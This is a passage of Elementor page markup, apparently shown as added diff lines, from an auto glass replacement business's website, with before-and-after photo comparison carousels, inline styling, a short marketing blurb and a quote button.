+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P2b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P2a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-625 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-625 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-625 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-625 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="625" class="elementor elementor-625" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P1a.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2024/05/P1b.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+									</div>
+
+			
+			
+					</div>
+						</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-3b589ff e-con-full bdt-backdrop-filter-yes e-flex bdt-filter-backdrop e-con e-child" data-id="3b589ff" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-896b9b0 elementor-invisible elementor-widget elementor-widget-ucaddon_side_border_heading" data-id="896b9b0" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="ucaddon_side_border_heading.default">
+				<div class="elementor-widget-container">
+					
+<!-- start Side Line Heading -->
+<style>/* widget: Side Line Heading */
+
+#uc_side_border_heading_elementor_896b9b0
+{
+  display:flex;
+}
+
+#uc_side_border_heading_elementor_896b9b0 .side_border_heading_title
+{
+  color:black;
+}
+
+#uc_side_border_heading_elementor_896b9b0 .side_border_heading_subtitle
+{
+  line-height:1.5em;
+  color:gray;
+}
+#uc_side_border_heading_elementor_896b9b0 .side_border_heading_line_holder{
+flex-shrink: 0;
+}
+
+#uc_side_border_heading_elementor_896b9b0 .side_border_heading_line_spacer{
+flex-shrink: 0;
+}
+
+</style>
+
+<div id="uc_side_border_heading_elementor_896b9b0">
+  <div class="side_border_heading_line_holder"><div class="side_border_heading_line" style="background-color:#45D300;"></div></div>
+  <div class="side_border_heading_line_spacer"></div>
+  <div>
+    <div class="side_border_heading_title"><span  class="uc_style_side_border_heading_elementor_title" style="color:#45D300;">SEE THE DIFFERENCE FOR YOURSELF</span></div>
+    <div class="side_border_heading_subtitle"></div>
+  </div>
+</div>
+<!-- end Side Line Heading -->				</div>
+				</div>
+				<div class="elementor-element elementor-element-7d91e99 elementor-widget elementor-widget-heading" data-id="7d91e99" data-element_type="widget" data-e-type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Results from Our Auto Glass Replacements</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-604e0d2 elementor-invisible elementor-widget elementor-widget-text-editor" data-id="604e0d2" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Damaged side or rear glass can compromise your safety and your vehicle’s appearance. That’s why drivers across the area rely on us for fast, expert auto glass replacement. Check out our before &amp; after photos to see the difference for yourself.</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-14780a1 elementor-invisible elementor-widget elementor-widget-button" data-id="14780a1" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;}" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-md" href="#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6IjIwNDYiLCJ0b2dnbGUiOmZhbHNlfQ%3D%3D">
+						<span class="elementor-button-content-wrapper">
+									<span class="elementor-button-text">GET AN INSTANT QUOTE</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-0b5f98e premium-carousel-ripple-yes elementor-hidden-desktop elementor-hidden-tablet pa-carousel-template pa-carousel-horizontal elementor-invisible elementor-widget elementor-widget-premium-carousel-widget" data-id="0b5f98e" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInRight&quot;}" data-widget_type="premium-carousel-widget.default">
+				<div class="elementor-widget-container">
+							<div id="premium-carousel-wrapper-0b5f98e" class="premium-carousel-wrapper premium-carousel-hidden carousel-wrapper-0b5f98e  premium-carousel-dots-below premium-carousel-scale" data-settings="{&quot;vertical&quot;:false,&quot;appearance&quot;:&quot;single&quot;,&quot;slidesToShow&quot;:1,&quot;infinite&quot;:true,&quot;speed&quot;:300,&quot;fade&quot;:true,&quot;autoplay&quot;:true,&quot;autoplaySpeed&quot;:8000,&quot;draggable&quot;:false,&quot;touchMove&quot;:false,&quot;adaptiveHeight&quot;:false,&quot;variableWidth&quot;:false,&quot;cssEase&quot;:&quot;ease&quot;,&quot;pauseOnHover&quot;:true,&quot;centerMode&quot;:false,&quot;arrows&quot;:false,&quot;dots&quot;:true,&quot;slidesDesk&quot;:1,&quot;slidesTab&quot;:1,&quot;slidesMob&quot;:1,&quot;animation&quot;:&quot;null&quot;,&quot;tabletBreak&quot;:1025,&quot;mobileBreak&quot;:768,&quot;navigation&quot;:[],&quot;carouselNavigation&quot;:&quot;dots&quot;,&quot;templatesNumber&quot;:11,&quot;hasNavSlider&quot;:false,&quot;mouseTilt&quot;:false,&quot;mouseTiltRev&quot;:false}">
+			<!-- Dots -->
+							<div class="premium-carousel-nav-dot">
+												<i class="fas fa-square" aria-hidden="true"></i>
+										</div>
+			
+			
+			<!-- Main Slides -->
+			<div id="premium-carousel-0b5f98e" class="premium-carousel-inner">
+										<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2669 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2669 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2669 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2669 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2669" class="elementor elementor-2669" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/13b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/13a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2664 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2664 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2664 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2664 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2664" class="elementor elementor-2664" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/12b-scaled.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/12a-scaled.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2659 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2659 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2659 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2659 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2659" class="elementor elementor-2659" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/11b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/11a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2654 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2654 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2654 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2654 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2654" class="elementor elementor-2654" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/10b-scaled.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/10a-scaled.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2649 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2649 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2649 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2649 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2649" class="elementor elementor-2649" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/9b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/9a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2644 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2644 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2644 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2644 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2644" class="elementor elementor-2644" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/8b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/8a-scaled.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
+												<div class="premium-carousel-template item-wrapper" >
+							<style>.elementor-2639 .elementor-element.elementor-element-0edaf9b{--display:flex;}.elementor-2639 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-before-label{left:5px;}.elementor-2639 .elementor-element.elementor-element-1997de6.premium-img-compare-horizontal .premium-twentytwenty-after-label{right:5px;}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-before-label span{color:#45D300;font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-after-label span{color:var( --e-global-color-332724a );font-size:25px;font-weight:500;line-height:53px;background-color:var( --e-global-color-accent );box-shadow:0px 0px 10px 0px #0042DD;}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-handle{width:75px;border-style:solid;border-color:var( --e-global-color-d0b532c );border-radius:20px;}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-left-arrow{border-right-color:var( --e-global-color-332724a );}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-right-arrow{border-left-color:var( --e-global-color-332724a );}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-down-arrow{border-top-color:var( --e-global-color-332724a );}.elementor-2639 .elementor-element.elementor-element-1997de6 .premium-twentytwenty-up-arrow{border-bottom-color:var( --e-global-color-332724a );}</style>		<div data-elementor-type="section" data-elementor-id="2639" class="elementor elementor-2639" data-elementor-post-type="elementor_library">
+			<div class="elementor-element elementor-element-0edaf9b e-flex e-con-boxed e-con e-parent" data-id="0edaf9b" data-element_type="container" data-e-type="container">
+					<div class="e-con-inner">
+				<div class="elementor-element elementor-element-1997de6 premium-img-compare-horizontal elementor-widget elementor-widget-premium-addon-image-comparison" data-id="1997de6" data-element_type="widget" data-e-type="widget" data-widget_type="premium-addon-image-comparison.default">
+				<div class="elementor-widget-container">
+					
+		<div class="premium-images-compare-container premium-twentytwenty-container" data-settings="{&quot;orientation&quot;:&quot;horizontal&quot;,&quot;visibleRatio&quot;:0.5,&quot;switchBefore&quot;:true,&quot;beforeLabel&quot;:&quot;Before&quot;,&quot;switchAfter&quot;:true,&quot;afterLabel&quot;:&quot;After&quot;,&quot;mouseMove&quot;:false,&quot;clickMove&quot;:false,&quot;showDrag&quot;:true,&quot;showSep&quot;:false,&quot;overlay&quot;:true,&quot;beforePos&quot;:&quot;top&quot;,&quot;afterPos&quot;:&quot;bottom&quot;,&quot;verbeforePos&quot;:null,&quot;verafterPos&quot;:null}">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/7b.jpeg" alt="Before">
+			<img decoding="async" src="https://firstclassautoglassnc.com/wp-content/uploads/2025/04/7a.jpeg" alt="After">
+		</div>
+
+						</div>
+				</div>
+					</div>
+				</div>
+				</div>
+		
+													</div>
